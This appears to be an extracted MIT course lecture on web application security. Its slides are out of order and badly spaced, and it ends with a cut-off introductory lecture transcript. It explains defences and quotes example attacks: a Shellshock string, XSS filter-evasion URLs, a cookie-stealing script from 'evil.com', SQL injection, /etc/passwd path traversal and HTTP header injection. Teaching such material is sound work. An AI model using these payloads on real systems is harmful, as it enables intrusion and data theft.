<doc>
  <source>MIT</source>
  <date>28/01/2023</date>
  <course>
    <course_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/</course_url>
    <course_title>Computer Systems Security</course_title>
    <course_tags>
      <list>Engineering </list>
      <list>Computer Science </list>
      <list>Software Design and Engineering </list>
    </course_tags>
  </course>
  <lectures>
    <lecture>
      <lecture_title>Securing Web Applications (PDF)</lecture_title>
      <lecture_pdf_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/mit6_858f14_lec9/</lecture_pdf_url>
      <lectureno>9</lectureno>
      <slides>
        <slide>
          <slideno>2</slideno>
          <text>Another example: Suppose that a dating site	&#13; allows	&#13; users to
include	&#13; HTML	&#13; in their profiles. An attacker can add HTML	&#13; that will
run in a *different* user's browser when that user looks at the
attacker's profile! Attacker could	&#13; steal the	&#13; user's cookie.
Another XSS defense: "httponly" cookies.
oA server can tell a browser that	&#13; c lient-side JavaScript should	&#13; not be	&#13; able
to access a cookie.	&#13; [The server does this by adding the "Httponly"	&#13; token	&#13; to
a "Set-cookie" HTTP response	&#13; value.]
oThis is only	&#13; a partial defense, since the attacker can still	&#13; is sue requests
thatcontain a user's cookies (CSRF).
Privilege separation: Use a separate domain for untrusted	&#13; content .
oFor example, Google stores untrusted content in googleusercontent.com
(e.g., cached copies of pages, Gmail attachments).
oEven
if XSS is
possible	&#13; in the untrusted content,	&#13; the	&#13; att acker	&#13; code will run
ina different	&#13; origin.
oThere may still be problems if the content in googleusercontent.com
points to URLs ingoogle.com.
Conten
t sanitization:	&#13; Take	&#13; untrusted	&#13; content and encode it	&#13; in	&#13; a way that
constrains	&#13; how it can	&#13; be	&#13; interpreted.
oEx: Django templates: Define an output p age	&#13; as a bunch of HTML	&#13; that has some
"holes" where external content can be inserted.
[https://docs.djangoproject.com/en/dev/topics/templates/#automatico
htmlo escaping]
oA template might contain code like this
&lt;b&gt;Hello {{ name }} &lt;/b&gt;
 
o	  where "name" is a variable that is resolved	&#13; when the	&#13; page	&#13; is processed	&#13; 
by the Django template  engine. That engine will	&#13; take  the value  of "name" (e.g.,  
from  a usero supplied	&#13; HTTP query	&#13; string), and then automaticall y escape	&#13; 
dangerous  characters.  For  example:
angle brackets &lt; and
&gt;--&gt;	&#13; &amp;lt;	&#13; and	&#13; &amp;gt ;
double	&#13; quotes	&#13; " --&gt;	&#13; &amp;quot;
oThis prevents	&#13; untrust
ed	&#13; content from injecting	&#13; HTML	&#13; into	&#13; the	&#13; rendered
page.
oTemplates cannot defend against all attacks!
For example . . .
&lt;div class={{ var }}&gt;...&lt;/div&gt;
 
o	 if	&#13; var	&#13; equals
'class1 onmouseover=javascript:func()'
o	 then there may be
an XSS attack, depending	&#13; on how the	&#13; b rowser	&#13; parses
the malformed HTML.	&#13; 
oSo, content sanitization	&#13; kind -of	&#13; works, but it's extremely difficult to parse
HTML	&#13; in an unambigous way.
oPossibly better approach: Completely disallow externally -provided
HTML, and	&#13; force external content to be expressed in a smaller language
(e.g., Markdown: http://daringfireball.net/projects/markdown/syntax ).
Validated	&#13; Markdown can then be translated into	&#13; HTML.
3</text>
        </slide>
        <slide>
          <slideno>1</slideno>
          <text>http://127.0.0.1:8282/cgi -
bin/uploadRecv.py?msg=&lt;script&gt;alert("XSS");&lt;/script&gt;
//The XSS attack doesn't work for this one . . .
//we'll see why later in the lecture.
http://127.0.0.1:8282/cgi -bin/uploadRecv.py?msg=&lt;IMG 
"""&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;
//This works! [At least on Chrome 37.0.2062.124.]
//Even though the browser caught the
//straightforward XSS injection, it

//incorrectly parsed our intentionally
//malformed HTML.

 
For more examples of XSS exploits via malformed code, go here:
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
Why is cross -site	&#13; scripting	&#13; so prevalent?
	 Dynamic web sites incorporate user content in HTML	&#13; pages (e.g., comments 
sections).
	 Web sites host uploaded user documents.
 
o	 HTML	&#13; documents can contain	&#13; arbitrary Javascript code! 
o	 Non
-HTML	&#13; documents may be content-sniffed as HTML by br owsers. 
	 Insecure Javascript programs may directly execute code that comes from 
external parties (e.g., eval(),
setTimeout(), etc.). 
XSS defenses
	 Chrome	&#13; and IE have a built-in	&#13; feature	&#13; which uses heuristics to detect	&#13; potential
cross -site scripting	&#13; attacks.
o Ex: Is a script	&#13; which is about to execute included	&#13; in the	&#13; request that  
fetched	&#13; the enclosing	&#13; page?
http://foo.com?q=&lt;script src="evil.com/cookieSteal.js"/&gt;
o	 If so,	&#13; this is strong evidence
that something suspiciou s	&#13; is about to 
happen!	&#13; The attack above is called a "reflected XSS attack," because the
server "reflects"	&#13; or "returns" the attacker-supplied	&#13; code to	&#13; the	&#13; user's	&#13; 
browser, executing	&#13; it in the	&#13; context of the	&#13; victim page.
This is why	&#13; our first XSS	&#13; attack in the CGI	&#13; example didn't work 
the br
owser detected reflected JavaScript in the URL, and removed
the trailing &lt;/script&gt;	&#13; before	&#13; it even reached	&#13; the CGI server.
However	&#13; . . .
o	 Filters	&#13; don't have	&#13; 100% coverage, because ther e	&#13; are a huge number of 
ways to	&#13; encode an XSS attack!
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
This is why	&#13; our second XSS	&#13; attack succeeded---the browser got	&#13; 
confused by our intentionally malformed HTML.	&#13; 
o	 Problem: Filters can't catch persistent X SSattacks in	&#13; which the server 
saves attacker-provided data,	&#13; which is then permanently distributed to
clients.
Classic	&#13; example: A "comments" section which allows use rs to post	&#13; 
HTML messages.
2</text>
        </slide>
        <slide>
          <slideno>7</slideno>
          <text>oLeverage the fact that image renderers process a file	&#13; top-down,	&#13; whereas
decompressors for .zip files typically start from the end and go upwards.
oAttackers realized that .jar files are based on the .zip format!
oTHUS	&#13; THE	&#13; GIFAR WAS BORN: half-gif,	&#13; half -jar ,all-evil.
Really simple to make a GIFAR: Just use	&#13; "cat" on Linux	&#13; or "cp" on
Wind
ows.
Suppose that target.com only allows external parties	&#13; to	&#13; upl oad	&#13; 
images objects.	&#13; The attacker	&#13; can	&#13; upload	&#13; a GIFAR, and the GIFAR
will	&#13; pass target.c om's	&#13; image validation tests!
Then, if the	&#13; attacker	&#13; can	&#13; launch a XSS attack, the attacker can inject
HTM
L	&#13; which	&#13; refers to	&#13; the ".gif" as an applet.
&lt;applet code="attacker.class"
archive="attacker.gif"
..&gt;
 
The browser	&#13; will
load	&#13; that applet and give it	&#13; the autho rity	&#13; of
target.com!
Web	&#13; applications are also vulnerable to covert	&#13; channel attacks.
A covert channel is a mechanism which
allows two applications to exchange
information,
even though the security model prohibits those applications from
communicating.
oThe channel is "covert"	&#13; because	&#13; it doesn't use official mechanisms for
cross -app communication.
Example #1: C
SS-based sniffing	&#13; attacks
oAttacker has a website that he can convince th e user to visit.
oAttacker goal: Figure out the other websites that	&#13; th e user	&#13; has	&#13; visited	&#13; (e.g.,
to determine the user's political views, medical history, etc.).
oExploit vector: A web browser uses different colors	&#13; to	&#13; display	&#13; visited
versus unvisited li
nks! So,	&#13; attacker page can	&#13; generate a big	&#13; list	&#13; of
candidate	&#13; URLs, and then	&#13; inspect the colors to see if the user has visited
any of them.
Can check thousands	&#13; of URLs	&#13; a second!
Can go	&#13; breadth -first,	&#13; find hits	&#13; for top -level	&#13; domains, then go depth -
first for each	&#13; hit.
oFix: Force getComputedStyle()	&#13; and related JavaScript int erfaces	&#13; to	&#13; alwa ys
say	&#13; that a link	&#13; is u nvisited.
 https://blog.mozilla.org/security/2010/03/31/plugging-the- css-
history- leak/
Example #2: Cache-based attacks
o *Attacker setup and goal are the same as before.
o *Exploit vector :	&#13; It's much faster for a browser to access data	&#13; t hat's	&#13; cached	&#13; 
instead	&#13; of fetching	&#13; it over the	&#13; network.	&#13; So, attacker	&#13; page	&#13; can generate	&#13; a
list of candidate images, try to load
them, and see which ones load
quickly!
8</text>
        </slide>
        <slide>
          <slideno>8</slideno>
          <text>oThis attack can	&#13; reveal your location	&#13; if the candidate images come from
geographically specific	&#13; images, e.g., Google Map tiles.
http://w2spconf.com/2014/papers/geo_inference.pdf
oFix: No good ones. A page could never cache objects,	&#13; but this	&#13; will hurt
performance. But suppose	&#13; that a site	&#13; doesn't cache	&#13; anything. Is it safe	&#13; 
from history sniffing? No!
Example #3: DNS-based attacks
oAttacker setup and goal are the same asbefore.
oExploit vector: Attacker page generates references	&#13; to	&#13; obj ects	&#13; in various
domains. If the user has already	&#13; accessed objects from that domain, the
hostnames will already reside in the DNS cache, making subsequent
object accesses	&#13; faster!
http://sip.cs.princeton.edu/pub/webtiming.pdf
oFix:	&#13; No good	&#13; ones. Could	&#13; use	&#13; raw IP	&#13; addresses for links,	&#13; but this	&#13; breaks	&#13; a
lot	&#13; of things (e.g. DNS -based load balancing).	&#13; However, suppose	&#13; that a
site	&#13; doesn't cache	&#13; anything and uses raw IP addresses for hostnames. Is it
safe from history sniffing? No!
Example #4: Rendering attacks.
oAttacker setup and goal are the same as before.
oExploit vector: Attacker page loads a candidate URL in an iframe. Before
the	&#13; browser	&#13; has	&#13; fetched the
content,	&#13; the	&#13; attacker	&#13; page	&#13; can	&#13; access
window.frames[1].location.href
 
o	 and read the value that	&#13; the attacker set. However, once	&#13; t he	&#13; browser	&#13; has	&#13; 
fetched	&#13; the content,	&#13; accessing that reference will return "undefined" due
to the same-origin	&#13; policy.	&#13; So, the attacker can	&#13; poll	&#13; the value and see how
long	&#13; it	&#13; takes to turn	&#13; "undefined".	&#13; If it	&#13; takes a long time, the page must not
have	&#13; been cached!
 http://lcamtuf.coredump.cx/cachetime/firefox.html
oFix: Stop using computers.
A web page also needs to use postMessage() securely.
Two frames from different origins can use postMessage() to asynchro nously
exchange immutable strings.
oSender gets a reference	&#13; to a window object, and does th is:
window.postMessage(msg, origin);
 
oReceiver defines an event handler	&#13; for t hespecial "message" event. The
event handler receives the msg and the origin.
Q: Why	&#13; does the receiver have to check	&#13; the origin of received message?
A: To
perform access control on senders! If the receiver implements sensitive
functionality, it shouldn't respond to requests from arbitary
origins.
oC
ommon	&#13; mistake: The receiver uses regular expressions	&#13; to	&#13; check the
sender's origin.
9</text>
        </slide>
        <slide>
          <slideno>9</slideno>
          <text>oEven if origin matches /. foo.com/, doesn't mean it's from foo.com! Could
be "xfoo.com", or "www.foo.com.bar.com".
oMore	&#13; details:
https://www.cs.utexas.edu/~shmat/shmat_ndss13postman.pdf
Q: Why	&#13; does the sender have to specify	&#13; the intended	&#13; origin of the	&#13; receiver?
A: postMessage() is applied to a window, not an origin.
oRemember that an attacker may be able to navigate a
window to a
different location.
oIf the attacker navigates the window, another origin may receive
message!
oIf the sender explictly s
pecifies a target origin, the	&#13; browser	&#13; checks
recipient origin before
delivering the msg.
oMore details: http://css.csail.mit.edu/6.858/2013/readings/post-
message.pdf
There are many other aspects to building a secure	&#13; web application.
Ex: ensure	&#13; proper access control	&#13; for server-side operations.
oDjango	&#13; provides	&#13; Python
decorators	&#13; to check access control rules.
Ex: Maintain logs for aud
iting,	&#13; prevent an attacker from modifying the log.
10</text>
        </slide>
        <slide>
          <slideno>10</slideno>
          <text>MIT OpenCourseWare
http://ocw.mit.edu
6.858 Computer Systems Security
Fall 2014
For information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms.</text>
        </slide>
        <slide>
          <slideno>4</slideno>
          <text>oA "web framework" is a software system that	&#13; provides infrastructure for
tasks like database accesses, session management, and the creation	&#13; of
templated content that	&#13; can	&#13; be used throughout	&#13; a site.
oOther frameworks	&#13; are more popular: PHP, Ruby	&#13; on Rails.
oIn the enterprise	&#13; world,	&#13; Java	&#13; servlets and ASP are also widely used.
Django developers have
put some amount of thought	&#13; into secur ity.
oSo, Django	&#13; is a good case study to see how people implement web
security in pra
ctice.
Django is probably better in terms of security than some of the alternatives like
PHP or Ruby	&#13; on Rails,	&#13; but t
he	&#13; devil is in the	&#13; details.
oAs we'll discuss two lectures from now, researchers have invented some
frameworks that	&#13; offer prov ably better secur ity.
[Ur/Web: http://www.impredicative.com/ur/]
Session management: cookies.
(http://pdos.csail.mit.edu/papers/webauth:sec10.pdfZoobar,	&#13; Django,	&#13; and many	&#13; web frameworks put a random	&#13; session	&#13; ID in the	&#13; cookie.	&#13; 
The Session ID refers to an entry in some session table on	&#13; the web	&#13; server.	&#13; The
entry	&#13; stores	&#13; a bunch of per-user	&#13; information.
Session cookies are	&#13; sensitive: adversary	&#13; can use them to impersonate a user!
As we discussed last lecture,
the same-origin policy	&#13; helps	&#13; to	&#13; protect cookies
but	&#13; yo
u	&#13; shouldn't	&#13; sha re	&#13; a domain with sites	&#13; that you don't trust!	&#13; Otherwise,
those sites	&#13; can	&#13; launch	&#13; a session fixation	&#13; attack:
1)Attacker	&#13; sets the session ID in the shar ed cookie.
2)User	&#13; navigates to the victim site; the attacker-choosen	&#13; session ID is sent
to the server and used to identify	&#13; the	&#13; user's session entry.
3)Later, the	&#13; attacker	&#13; can navigate to the victim site using the attacker-
chosen session id, and access the user' s state!
Hmmm,	&#13; but what if we don't want to have server-side state	&#13; for every logged	&#13; in
user?
Stateless cookies
If you don't	&#13; have the notion of a session,	&#13; then you need to	&#13; authenticate	&#13; every
request!
oIdea: Authenticate the cookie using cryptography.
oPrimitive: Message authentication codes (MACs)
Think of it l
ike	&#13; a keyed	&#13; hash,	&#13; e.g., HMAC-SHA1:	&#13; H(k,	&#13; m)
-Client an
dserver share	&#13; a key;	&#13; client uses key to produce	&#13; the
message, and the server us es the key to verify the message.
oAWS S3 REST Services use this kind of cookie
[http://docs.aws.amazon.com/AmazonS3/latest/dev/RESTAuthenticatio
n.html ].
Amazon	&#13; gives each developer an	&#13; AWS	&#13; Access Key	&#13; ID,	&#13; and an	&#13; AWS	&#13; 
secret key.	&#13; Each	&#13; request looks like this:
5</text>
        </slide>
        <slide>
          <slideno>6</slideno>
          <text>oBenefit: The cookie is not	&#13; sent	&#13; over the network	&#13; to the server.
oBenefit: Your authentication scheme is not subject to complex same-
origin policy	&#13; for	&#13; cookies	&#13; (e.g., DOM storage	&#13; is bound to a single origin, 
unlike a cookie, which can be bound to multiple  subdomains).
Client -side	&#13; X.509	&#13; 
certificates.
oBenefit:
Web	&#13; applications can't	&#13; steal or explicitly manipulate each other's
certificat
es.
oDrawback:	&#13; Have	&#13; weak story	&#13; for revocation (we'll talk about this more in
fu
ture lectures).
oDrawback:	&#13; Poor usability ---users don't want to manage a certificate for
each site	&#13; that they	&#13; visit!
oBenefit/drawback: There isn't	&#13; a notion	&#13; of a session,	&#13; since the certificate is
"always on." For impor tant	&#13; ope ration
s, the	&#13; application will	&#13; have to
prompt for a password.
The web stack has some protocol ambiguities that	&#13; can	&#13; lead to se curity holes.
HTTP	&#13; header injection from XMLHttpRequests
oJavascript can ask browser	&#13; to	&#13; add	&#13; extra headers	&#13; in the	&#13; request.	&#13; So, w hat
happens if we	&#13; do this?
var x = new XMLHttpRequest();
x.open("GET", "http://foo.com");
x.setRequestHeader("Content-Length", "7");
//Overrides the browser-computed field!
x.send("Gotcha!\r\n" +
"GET /something.html HTTP/1.1\r\n" + 
"Host: bar.com");
 
oThe server at
foo.com may interpret this as two separate r equests! Later,
when	&#13; the browser receives the second request, it may overwrite a cache
entry	&#13; belonging	&#13; to	&#13;  bar.com with content from foo.com!
oSolution: Prevent XMLHttpRequests	&#13; from setting sensitive	&#13; fiel ds	&#13; like
"Host:"	&#13; or "Content-Length".
oTakehome point: Unambiguous encoding is critical!	&#13; Buil d	&#13; reliable
escaping/encoding!
URL parsing ("The Tangled	&#13; Web"	&#13; page 154 )
oFlash	&#13; had	&#13; a slightly	&#13; different URL	&#13; parser	&#13; than the browse r.
oSuppose the URL was http://example.com:80@foo.com/
Flash would compute
the origin as "example.com".
Browser would compute the origin as "foo.com".
oBad idea: complex parsing rules just to determine	&#13; the principal.
oBad idea: re -implementing	&#13; complex parsing code.
Here's a hilariou
s/terrifying way	&#13; to	&#13; launch attacks using	&#13; Java	&#13; applets th at	&#13; are
stored in the .jar format.
oIn 2007, Lifehacker.com posted an article which de scribed how	&#13; you	&#13; could
hide .zip files	&#13; inside of .gif files.
7</text>
        </slide>
        <slide>
          <slideno>5</slideno>
          <text>GET /photos/cat.jpg HTTP/1.1
Host: johndoe.s3.amazonaws.com
Date: Mon, 26 Mar 2007 19:37:58 +0000
Authorization: AWS 
AKIAIOSFODNN7EXAMPLE:frJIUN8DYpKDtOLCwoyllqDzg=
|___________________| |________________________|
Access key ID 	 MAC signature
 
Here's what
is sign
ed	&#13; (this	&#13; is slightly simplified, see the link above
for the fu
ll story):
StringToSign = HTTP-Verb + "\n" +
Content-MD5 + "\n" +
 
Content-Type + "
\n" +
Date + "\n" +
 
ResourceName
 
oNote	&#13; that this	&#13; kind	&#13; of cookie	&#13; doesn't expire	&#13; in the traditio nal	&#13; sense
(although	&#13; the	&#13; server will reject the request if Amazon has revoked the
user's key).
You can embed an "expiration" field in a *particular*	&#13; reques t,	&#13; and
then	&#13; hand th at	&#13; URL to a third -party,	&#13; such	&#13; that, if the	&#13; third-party	&#13; 
waits too long, AWS will	&#13; reject	&#13; the request	&#13; as expired.
AWSAccessKeyId=AKIAIOSFODNN7EXAMPLE&amp;Expires=1141889120&amp;Sign
ature=vjbyPxybd... |__________________|
 
Included in the string
that's covered by the
signature!
 
oNote that the format
for the
string-to -hash should provide unambiguous
parsing!
 Ex: No component should be allowed to embed the escape
character,	&#13; otherwise the	&#13; server-side	&#13; parser may get confused.
Q: How	&#13; do yo
u	&#13; log	&#13; out	&#13; with this kind of cookie design?
A: Impossible, if the server is stateless (closing asession would require a server -
side table of revoked	&#13; cookies).
If server can be stateful,
session IDs make this much simpler.
There's a fundamental trade-off	&#13; between reducing server-side	&#13; memory state and
increasing	&#13; server
-side	&#13; computation overhead for cryptography.
Alternatives to cookies for session management.
Use HTML5	&#13; local storage, and implement	&#13; your own authentication	&#13; in	&#13; Javas cript.
oSome web frameworks like Meteor do this.
6</text>
        </slide>
        <slide>
          <slideno>0</slideno>
          <text>6.858 Lecture 9
WEB	&#13; SECURITY: Part	&#13; II
Last lecture, we	&#13; looked	&#13; at a core security mechanism for the web: the same-origin	&#13; 
policy. In this
lecture,	&#13; we'll continue to look at how we	&#13; can	&#13; build	&#13; secure web
applications.
The recent "Shell Shock"	&#13; bug	&#13; is a good example of how difficult it is to	&#13; design w eb
services that compose multiple technologies.
A web client can include extra headers in its HTTP	&#13; requests, and determine
which quer y parameters are in a request.  Ex:
oGET /query.cgi?searchTerm=cats HTTP	&#13; 1.1
oHost:	&#13;  www.example.com
oCustom -
header:	&#13; Custom -val
ue
CGI	&#13; servers map
the various components of the HTTP	&#13; request to Unix
environment variables.
Vulnerabilit
y:	&#13; Bash	&#13; has	&#13; a parsing bug in the way that	&#13; it	&#13; handles the setting	&#13; of
environment variables!	&#13; If a string	&#13; begins	&#13; with a certain set of malformed bytes,
bash will	&#13; continue to parse	&#13; the rest	&#13; of the string	&#13; and execute any commands that
it finds! For example, if you set an environment variable to a value like this
() { :;}; /bin/id
 
	 will	&#13; confuse the bash parser,	&#13; and cause it to execute the /bin/id command
(which displays the UID
and GID information for the current	&#13; user).
Live demo
oStep 1: Run the CGI	&#13; server.
./victimwebserver.py 8082
oStep 2: Run the exploit scr
ipt.
./shellshockclient.py localhost:8082 index.html
More information:  http://seclists.org/oss -sec/2014/q3/650
Shell  Shock is a particular  instance of security  bugs which arise  from  imprope r 
content sanitzation.
 Another type of content sanitzation	&#13; failure	&#13; occurs	&#13; during	&#13; cross -
site scrip
ting	&#13; attacks	&#13; (XSS).
Example:  Suppose that  a CGI	&#13; script embeds  a query string parameter in the HTML	&#13;  
that it genera
tes.
Demo:
Step 1: Run the CGI	&#13; ser
ver.
o./cgiServer.py
Step 2: In browser,	&#13; load these
URLs:
http://127.0.0.1:8282/cgi -bin/uploadRecv.py?msg=hello
http://127.0.0.1:8282/cgi- bin/uploadRecv.py?msg=&lt;b&gt;hello&lt;/b&gt;
 
1</text>
        </slide>
        <slide>
          <slideno>3</slideno>
          <text>Content	&#13; Security Policy (CSP):	&#13; Allows a web server to	&#13; tell the	&#13; brow ser	&#13; which
kinds of resources	&#13; can be	&#13; loaded, and	&#13; the	&#13; allowable origins for those	&#13; resources.
oServer specifies one or more headers of the type "Content -Secur ity-
Policy".
oExample:
Content -Security-Pol
icy:	&#13; default-src	&#13; 'self' *.mydomain.com
Only allow content from the page's domain and its
subdomains.
oYou	&#13; can specify	&#13; se
parate policies for where images can come from, where
scripts can come
from, frames, plugins, etc.
oCSP	&#13; also	&#13; prevents inline JavaScript,	&#13; and JavaScript interfaces	&#13;  like	&#13; eval()
which allow for dynamic JavaScript generation.
Some browsers allow servers to disable content-type sniffing (X -Content -Type-
Optio
ns: nosniff).
SQL injection attacks.
Suppose that the application	&#13; nee
ds to issue SQL query based	&#13; on user input:
oquery = "SELECT * FRO
M table WHERE	&#13; us erid="	&#13; + userid
Problem: adversary can supply userid that changes SQL query	&#13; structure
o	 e.g.,"0; DELETE FROM t
able;"
What	&#13; if we add quoti
ng	&#13; around userid?
oquery = "SELECT	&#13; * FROM table WHERE	&#13; us erid='" + userid + "'"
The vulnerability	&#13; still exists!	&#13; The attacker can just add another	&#13; quote	&#13; as first
byte of userid.
Real solution: unambiguously encode data.
Ex: replace	&#13; ' with \',	&#13; et
c.
oSQL libraries	&#13; provide	&#13; escaping functions.
Django	&#13; defines a
query	&#13; abstraction	&#13; layer which
sits atop	&#13; SQL and allows
applications to avoid writing	&#13; raw	&#13; SQL (although they can do it if they	&#13; really	&#13; want
to).
(Possibly fake) German license plate which says ";DROP TABLE" to avoid
speeding cameras which use OCR+SQL to e xtract	&#13; license plate number.
You	&#13; can also run	&#13; int o	&#13; problems if untrusted entities can supply	&#13; filenames.
Ex: Suppose	&#13; that a web server reads files based on	&#13; user-supplied	&#13; parameters.
oopen("/www/images/" + filename)
Problem:
filename might look like this:
o../../../../../etc/passwd
As with SQL injection, the server  must sanitize  the user  input: the server  must 
reject file names with slashes,  or encode  the slashes  in some  way.
What	&#13; is Django?
Moderately popular  web  framework, used  by some  large sites  like Instagram ,
Mozilla, and Pinterest.
4</text>
        </slide>
      </slides>
      <videos>
        <video>
          <video_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/lecture-1-introduction-threat-models/</video_url>
          <video_title>Lecture 1: Introduction, Threat Models</video_title>
          <transcript>
            <slice>
              <time_slice>0:00</time_slice>
              <text_slice>The following content is
provided under a Creative</text_slice>
            </slice>
            <slice>
              <time_slice>0:02</time_slice>
              <text_slice>Commons license.</text_slice>
            </slice>
            <slice>
              <time_slice>0:03</time_slice>
              <text_slice>Your support will help
MIT OpenCourseWare</text_slice>
            </slice>
            <slice>
              <time_slice>0:06</time_slice>
              <text_slice>continue to offer high quality
educational resources for free.</text_slice>
            </slice>
            <slice>
              <time_slice>0:10</time_slice>
              <text_slice>To make a donation or to
view additional materials</text_slice>
            </slice>
            <slice>
              <time_slice>0:12</time_slice>
              <text_slice>from hundreds of MIT courses,
visit MIT OpenCourseWare</text_slice>
            </slice>
            <slice>
              <time_slice>0:16</time_slice>
              <text_slice>at ocw.mit.edu</text_slice>
            </slice>
            <slice>
              <time_slice>0:26</time_slice>
              <text_slice>PROFESSOR: In this
class, this semester,</text_slice>
            </slice>
            <slice>
              <time_slice>0:27</time_slice>
              <text_slice>the other co-lecturer
is going to be</text_slice>
            </slice>
            <slice>
              <time_slice>0:29</time_slice>
              <text_slice>James Mickens, who is a visiting
professor from Microsoft</text_slice>
            </slice>
            <slice>
              <time_slice>0:32</time_slice>
              <text_slice>Research.</text_slice>
            </slice>
            <slice>
              <time_slice>0:33</time_slice>
              <text_slice>He'll lecture on some other
topics like web security</text_slice>
            </slice>
            <slice>
              <time_slice>0:36</time_slice>
              <text_slice>later on.</text_slice>
            </slice>
            <slice>
              <time_slice>0:37</time_slice>
              <text_slice>But we'll decide later what's
going on exactly, in terms</text_slice>
            </slice>
            <slice>
              <time_slice>0:40</time_slice>
              <text_slice>of the lecture split up.</text_slice>
            </slice>
            <slice>
              <time_slice>0:41</time_slice>
              <text_slice>We also have four TAs this year,
Stephen, Webb, [INAUDIBLE],</text_slice>
            </slice>
            <slice>
              <time_slice>0:46</time_slice>
              <text_slice>and James.</text_slice>
            </slice>
            <slice>
              <time_slice>0:47</time_slice>
              <text_slice>And hopefully you'll meet them
in office hours over the year</text_slice>
            </slice>
            <slice>
              <time_slice>0:52</time_slice>
              <text_slice>if you need help.</text_slice>
            </slice>
            <slice>
              <time_slice>0:54</time_slice>
              <text_slice>So the plan for this
class is to understand</text_slice>
            </slice>
            <slice>
              <time_slice>0:57</time_slice>
              <text_slice>how to build secure systems,
why computer systems sometimes</text_slice>
            </slice>
            <slice>
              <time_slice>1:01</time_slice>
              <text_slice>are insecure and how we
can make them better,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04</time_slice>
              <text_slice>and what goes wrong.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06</time_slice>
              <text_slice>And in order to do this, there's
not really a great textbook</text_slice>
            </slice>
            <slice>
              <time_slice>1:08</time_slice>
              <text_slice>about this topic.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09</time_slice>
              <text_slice>So instead, what
we're going to do</text_slice>
            </slice>
            <slice>
              <time_slice>1:11</time_slice>
              <text_slice>is, each lecture
other than this one is</text_slice>
            </slice>
            <slice>
              <time_slice>1:13</time_slice>
              <text_slice>going to be focused around some
research, typically a paper,</text_slice>
            </slice>
            <slice>
              <time_slice>1:16</time_slice>
              <text_slice>that we'll assign on
the website and you guys</text_slice>
            </slice>
            <slice>
              <time_slice>1:19</time_slice>
              <text_slice>should read ahead of time.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21</time_slice>
              <text_slice>And there are some
question that you</text_slice>
            </slice>
            <slice>
              <time_slice>1:22</time_slice>
              <text_slice>should answer in the submission
system about the paper.</text_slice>
            </slice>
            <slice>
              <time_slice>1:25</time_slice>
              <text_slice>And submit your own question
by 10:00 PM before the lecture</text_slice>
            </slice>
            <slice>
              <time_slice>1:28</time_slice>
              <text_slice>day.</text_slice>
            </slice>
            <slice>
              <time_slice>1:29</time_slice>
              <text_slice>And then when you
come to lecture,</text_slice>
            </slice>
            <slice>
              <time_slice>1:30</time_slice>
              <text_slice>we'll actually discuss
the paper, figure out,</text_slice>
            </slice>
            <slice>
              <time_slice>1:31</time_slice>
              <text_slice>what is the system?</text_slice>
            </slice>
            <slice>
              <time_slice>1:32</time_slice>
              <text_slice>What problem does it solve?</text_slice>
            </slice>
            <slice>
              <time_slice>1:34</time_slice>
              <text_slice>When does it work?</text_slice>
            </slice>
            <slice>
              <time_slice>1:35</time_slice>
              <text_slice>When does it not work?</text_slice>
            </slice>
            <slice>
              <time_slice>1:36</time_slice>
              <text_slice>Are these ideas any
good in other cases?</text_slice>
            </slice>
            <slice>
              <time_slice>1:39</time_slice>
              <text_slice>Et cetera.</text_slice>
            </slice>
            <slice>
              <time_slice>1:39</time_slice>
              <text_slice>And hopefully, through
these case studies,</text_slice>
            </slice>
            <slice>
              <time_slice>1:41</time_slice>
              <text_slice>we'll get some appreciation
of how do we actually build</text_slice>
            </slice>
            <slice>
              <time_slice>1:45</time_slice>
              <text_slice>systems that are secure.</text_slice>
            </slice>
            <slice>
              <time_slice>1:47</time_slice>
              <text_slice>And we have some preliminary
schedule up on the website.</text_slice>
            </slice>
            <slice>
              <time_slice>1:49</time_slice>
              <text_slice>If there's other topics you guys
are particularly interested in,</text_slice>
            </slice>
            <slice>
              <time_slice>1:52</time_slice>
              <text_slice>or if there's particular
papers you're excited about,</text_slice>
            </slice>
            <slice>
              <time_slice>1:54</time_slice>
              <text_slice>just send us email and
we'll see if we can</text_slice>
            </slice>
            <slice>
              <time_slice>1:56</time_slice>
              <text_slice>fit them in or do something.</text_slice>
            </slice>
            <slice>
              <time_slice>1:57</time_slice>
              <text_slice>We're pretty flexible.</text_slice>
            </slice>
            <slice>
              <time_slice>1:59</time_slice>
              <text_slice>So if there's
anything that you'd</text_slice>
            </slice>
            <slice>
              <time_slice>2:01</time_slice>
              <text_slice>like to hear more
about, just let us know.</text_slice>
            </slice>
            <slice>
              <time_slice>2:03</time_slice>
              <text_slice>And in a similar vein, if
you ever have a question</text_slice>
            </slice>
            <slice>
              <time_slice>2:08</time_slice>
              <text_slice>or if there's some mistake,
just interrupt and ask</text_slice>
            </slice>
            <slice>
              <time_slice>2:11</time_slice>
              <text_slice>us what's going on
in lecture, anytime.</text_slice>
            </slice>
            <slice>
              <time_slice>2:15</time_slice>
              <text_slice>Security is, in many ways,
all about the details</text_slice>
            </slice>
            <slice>
              <time_slice>2:18</time_slice>
              <text_slice>and getting everything right.</text_slice>
            </slice>
            <slice>
              <time_slice>2:20</time_slice>
              <text_slice>And I will inevitably
make mistakes.</text_slice>
            </slice>
            <slice>
              <time_slice>2:21</time_slice>
              <text_slice>So if something
doesn't seem right,</text_slice>
            </slice>
            <slice>
              <time_slice>2:23</time_slice>
              <text_slice>there's a good chance it's not.</text_slice>
            </slice>
            <slice>
              <time_slice>2:24</time_slice>
              <text_slice>And you should just
interrupt and ask.</text_slice>
            </slice>
            <slice>
              <time_slice>2:26</time_slice>
              <text_slice>And we'll figure
out what's going on</text_slice>
            </slice>
            <slice>
              <time_slice>2:28</time_slice>
              <text_slice>and what's the right
way to do things.</text_slice>
            </slice>
            <slice>
              <time_slice>2:30</time_slice>
              <text_slice>And I guess in terms of
the class organization,</text_slice>
            </slice>
            <slice>
              <time_slice>2:33</time_slice>
              <text_slice>the other large
part of the class,</text_slice>
            </slice>
            <slice>
